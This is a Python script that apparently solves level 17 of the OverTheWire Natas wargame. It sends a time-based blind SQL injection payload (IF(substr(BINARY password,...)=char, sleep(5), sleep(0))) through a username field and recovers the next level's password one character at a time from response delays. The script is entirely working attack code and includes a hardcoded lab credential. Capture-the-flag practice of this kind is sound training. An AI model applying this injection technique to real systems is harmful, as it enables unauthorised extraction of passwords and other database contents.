import re
import requests
import time
import string

level = 17
creds = ('natas17','8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
url   = 'http://natas%s.natas.labs.overthewire.org/' % level

session = requests.Session()
response = session.get(url,auth=creds)
data = response.text

password = ""
char_set = string.ascii_lowercase[:26]+string.ascii_uppercase[:26]
print(char_set)
for i in range(10):
	char_set+=str(i)

for i in range(1,33):
	print("Current Guess => "+password)
	for char in char_set:
		injection = 'natas18" AND IF(substr(BINARY password,'+str(i)+',1) = "'+char+'",sleep(5),sleep(0))#'
		#print(injection)
		formdata = {'submit':'Check existence','username':injection}
		stime = time.time()
		response = session.post(url,auth=creds,data=formdata)
		etime = time.time()
		if (etime-stime) >= 5:
			password+=char
		data = response.text

print(password)